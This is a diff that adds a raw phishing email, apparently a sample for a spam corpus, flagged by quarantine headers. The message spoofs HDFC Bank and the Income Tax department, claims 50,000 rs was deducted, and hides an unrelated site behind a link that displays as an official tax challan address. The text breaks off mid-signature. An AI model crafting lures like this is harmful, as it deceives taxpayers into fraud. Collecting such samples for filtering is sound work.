@@ -1,0 +1,64 @@
+Return-Path: <hdfcbanksmartstatement@hdfcbank.net>
+Delivered-To: spam-quarantine
+X-Envelope-To: <admin@mslindia.net>
+X-Envelope-To-Blocked: <admin@mslindia.net>
+X-Quarantine-ID: <aZHN2w81-0mn>
+X-Spam-Flag: YES
+X-Spam-Score: 23.08
+X-Spam-Level: ***********************
+X-Spam-Status: Yes, score=23.08 tag=2 tag2=6.31 kill=6.31
+	tests=[FORGED_MUA_OUTLOOK=2.785, FORGED_OUTLOOK_HTML=0.001,
+	FORGED_OUTLOOK_TAGS=0.565, FROM_MISSPACED=2.99, FROM_MISSP_DKIM=0.001,
+	FROM_MISSP_EH_MATCH=2.841, FROM_MISSP_MSFT=0.482,
+	FROM_MISSP_NO_TO=2.316, FROM_MISSP_USER=1.238,
+	FSL_CTYPE_WIN1251=0.607, FSL_UA=0.001, FSL_XM_419=0.328,
+	HTML_IMAGE_ONLY_12=1.629, HTML_MESSAGE=0.001,
+	HTML_MIME_NO_HTML_TAG=0.635, MIME_HTML_ONLY=1.105,
+	MISSING_HEADERS=1.207, MISSING_MID=0.14, NSL_RCVD_FROM_USER=1.963,
+	RDNS_NONE=1.274, SPF_PASS=-0.001, TO_NO_BRKTS_FROM_MSSP=0.961,
+	TO_NO_BRKTS_NORDNS_HTML=0.001, T_REMOTE_IMAGE=0.01]
+	autolearn=unavailable
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id aZHN2w81-0mn for <admin@mslindia.net>;
+	Mon, 25 Mar 2019 08:06:40 +0530 (IST)
+Received: from smtpout3.netcore.co.in (unknown [202.162.241.7])
+	by mx10.jcbl.com (Postfix) with ESMTPS id 26CE2F26D9A
+	for <rk_gairola@mslindia.net>; Mon, 25 Mar 2019 08:06:38 +0530 (IST)
+Received: from smtp32.netcore.in (smtp32.netcore.in [202.162.240.162])
+	by smtpout3.netcore.co.in (Postfix) with ESMTP id 20B6EDB9EA9;
+	Mon, 25 Mar 2019 08:07:47 +0530 (IST)
+Received: from User (unknown [14.102.58.60])
+	(Authenticated sender: Ronak.Panchal@tradebulls.in)
+	by smtp32.netcore.in (Postfix) with ESMTPA id B28E61D5815A;
+	Mon, 25 Mar 2019 08:06:53 +0530 (IST)
+From: "Tax Invoice"<hdfcbanksmartstatement@hdfcbank.net>
+Subject: Your 2019 TDS Payment Was Declined
+X-Intloopheader: 0
+Date: Mon, 25 Mar 2019 03:37:40 +0100
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-SMTP31-MailScanner-Information: Please contact the ISP for more information
+X-MailScanner-ID: B28E61D5815A.AB6FB
+X-SMTP31-MailScanner: Found to be clean
+X-MailScanner-From: hdfcbanksmartstatement@hdfcbank.net
+X-Spam-Status: No
+
+&nbsp;<img class="yiv3059612191ycb4180488822" width="400" height="70"></td></tr>
+<tr id="yui_3_16_0_ym19_1_1515372180698_1920">
+<td id="yui_3_16_0_ym19_1_1515372180698_1919" height="359"><u></u>
+<p id="yui_3_16_0_ym19_1_1515372180698_2020">Dear Tax Payer, <br><br>Your Tax payment was successful. 50,000 rs has been deducted from your Net banking Account. Your Payment 
+Challan is attached in the link below.</p>
+<p id="yui_3_16_0_ym19_1_1515372180698_2142">&nbsp;</p>
+<p id="yui_3_16_0_ym19_1_1515372180698_2145"> <u id="yui_3_16_0_ym19_1_1515372180698_2144"><a rel="nofollow" target="_blank" href="http://neelaygroup.com/js/404.htm" id="yui_3_16_0_ym19_1_1515372180698_2143">https://www.incometaxindia. gov.in/PaymentChallan </a></u></p>
+<p id="yui_3_16_0_ym19_1_1515372180698_2019" align="left">&nbsp;</p>
+<p id="yui_3_16_0_ym19_1_1515372180698_2146" align="left">Please download and save a copy of your Payment Challan 
+below.</p>
+<p id="yui_3_16_0_ym19_1_1515372180698_2005" align="left">&nbsp;</p>
+<p id="yui_3_16_0_ym19_1_1515372180698_1918"><br>Sincerely,<br>Income Ta
